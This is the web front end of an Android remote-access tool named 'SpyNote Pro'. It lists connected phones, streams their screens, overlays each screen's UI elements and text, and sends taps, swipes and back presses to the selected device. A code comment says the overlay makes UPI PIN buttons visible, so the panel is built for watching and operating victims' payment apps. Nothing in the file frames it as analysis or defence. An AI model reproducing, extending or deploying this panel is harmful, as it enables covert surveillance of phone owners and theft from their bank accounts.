<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Pro - Layout + Screenshot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 100;
            background: rgba(0,0,0,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 16px; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
        }
        .device { 
            padding: 16px; margin: 10px 0; background: rgba(50,50,70,0.8); 
            cursor: pointer; border-radius: 12px; transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .device:hover { 
            background: rgba(0,170,120,0.9); transform: translateX(8px); box-shadow: 0 8px 25px rgba(0,170,120,0.3);
        }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }

        #phone-container {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: min(95vw, 450px); height: min(95vh, 900px); 
            background: #000; border-radius: 40px; 
            padding: 30px 25px; box-shadow: 0 30px 80px rgba(0,0,0,0.8);
            border: 3px solid rgba(255,255,255,0.1);
            touch-action: none;
        }
        
        #screen-canvas { 
            width: 100%; height: 100%; 
            border-radius: 25px; background: #111;
            cursor: pointer; position: relative;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
        }

        /* üî• LAYOUT OVERLAY */
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; border-radius: 25px;
        }
        .ui-element {
            position: absolute; border: 2px solid rgba(0,255,136,0.8);
            background: rgba(0,255,136,0.1); border-radius: 4px;
            backdrop-filter: blur(5px); transition: all 0.2s;
            font-size: 11px; padding: 2px 4px; font-family: monospace;
            max-width: 120px; overflow: hidden; text-overflow: ellipsis;
            white-space: nowrap; box-shadow: 0 2px 8px rgba(0,255,136,0.3);
        }
        .ui-element:hover {
            border-color: #00ff88; background: rgba(0,255,136,0.2);
            transform: scale(1.05); z-index: 10;
        }
        .clickable { border-color: #ff6b6b !important; background: rgba(255,107,107,0.2) !important; }
        .editable { border-color: #4ecdc4 !important; background: rgba(78,205,196,0.3) !important; }

        #status-bar {
            position: fixed; top: 15px; right: 15px; z-index: 100;
            background: rgba(0,0,0,0.9); padding: 15px 20px; 
            border-radius: 12px; backdrop-filter: blur(20px); font-size: 13px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        #fps-counter { color: #00ff88; font-weight: bold; }

        #controls {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 10px; z-index: 100;
        }
        button {
            padding: 12px 24px; background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; border-radius: 25px; cursor: pointer;
            font-size: 14px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 6px 20px rgba(102,126,234,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.6); }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 20px; color: #00ff88;">üì± Devices + Layout</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Layout: <span id="layoutCount">0</span></div>
        <div>Device: <span id="selectedDevice">-</span> | Latency: <span id="latency">0ms</span></div>
    </div>

    <div id="phone-container">
        <canvas id="screen-canvas"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="controls">
        <button onclick="toggleLayout()">üîç Layout</button>
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, layoutCount = 0, lastFrameTime = 0;
        let showLayout = true;
        let isDragging = false;
        let dragStart = { x: 0, y: 0 };

        const canvas = document.getElementById('screen-canvas');
        const ctx = canvas.getContext('2d');
        const overlayCanvas = document.getElementById('layout-overlay');
        const overlayCtx = overlayCanvas.getContext('2d');
        const phoneContainer = document.getElementById('phone-container');
        const deviceList = document.getElementById('device-list');

        socket.on('connect', () => {
            document.getElementById('connectionStatus').textContent = '‚úÖ Connected';
            document.getElementById('connectionStatus').style.color = '#00ff88';
            loadDevices();
        });

        // üî• SCREENSHOT
        socket.on('screenshot-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneContainer.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                overlayCanvas.width = rect.width;
                overlayCanvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    document.getElementById('fps').textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            img.src = 'data:image/jpeg;base64,' + data.screenshot;
        });

        // üî• LAYOUT OVERLAY (UPI PIN BUTTONS VISIBLE)
        socket.on('layout-data', (data) => {
            if (data.deviceId !== currentDevice || !showLayout) return;
            
            const rect = phoneContainer.getBoundingClientRect();
            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            
            data.elements.forEach(element => {
                const [tl, br] = element.bounds;
                const x = (tl[0] / deviceWidth) * rect.width;
                const y = (tl[1] / deviceHeight) * rect.height;
                const w = ((br[0] - tl[0]) / deviceWidth) * rect.width;
                const h = ((br[1] - tl[1]) / deviceHeight) * rect.height;
                
                // Draw bounds
                overlayCtx.strokeStyle = element.clickable ? '#ff6b6b' : 
                                        element.editable ? '#4ecdc4' : 'rgba(0,255,136,0.8)';
                overlayCtx.lineWidth = 2;
                overlayCtx.strokeRect(x, y, w, h);
                
                // Draw text label
                if (element.text) {
                    overlayCtx.fillStyle = 'rgba(0,0,0,0.8)';
                    overlayCtx.fillRect(x, y, Math.min(120, w), 20);
                    overlayCtx.fillStyle = '#00ff88';
                    overlayCtx.font = '11px monospace';
                    overlayCtx.fillText(element.text.toString().slice(0,15), x + 2, y + 14);
                }
            });
            
            document.getElementById('layoutCount').textContent = data.elements.length;
            layoutCount++;
        });

        function getScaledCoords(clientX, clientY) {
            const rect = phoneContainer.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Touch/Mouse Controls
        phoneContainer.addEventListener('mousedown', startTouch);
        phoneContainer.addEventListener('mousemove', dragTouch);
        phoneContainer.addEventListener('mouseup', endTouch);
        phoneContainer.addEventListener('touchstart', startTouch, { passive: false });
        phoneContainer.addEventListener('touchmove', dragTouch, { passive: false });
        phoneContainer.addEventListener('touchend', endTouch, { passive: false });

        function startTouch(e) {
            e.preventDefault();
            isDragging = true;
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            dragStart = coords;
            sendTap(coords.x, coords.y);
        }

        function dragTouch(e) {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
        }

        function endTouch() {
            isDragging = false;
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            document.getElementById('selectedDevice').textContent = deviceId.slice(0,8);
            socket.emit('select-device', { deviceId });
        }

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action: 'tap', x, y 
            });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleLayout() {
            showLayout = !showLayout;
            overlayCanvas.style.opacity = showLayout ? '1' : '0.1';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        function loadDevices() {
            fetch('/devices').then(r => r.json()).then(devices => {
                deviceList.innerHTML = devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,15) || id.slice(0,8)}</b><br>
                        <small>${info.width || ''}x${info.height || ''}</small>
                        <div style="margin-top: 5px;">
                            ${info.connected ? 'üü¢ LIVE + LAYOUT' : 'üî¥ OFFLINE'}
                        </div>
                    </div>
                `).join('') || '<div style="opacity:0.5;">No devices</div>';
            });
        }

        setInterval(loadDevices, 3000);
    </script>
</body>
</html>
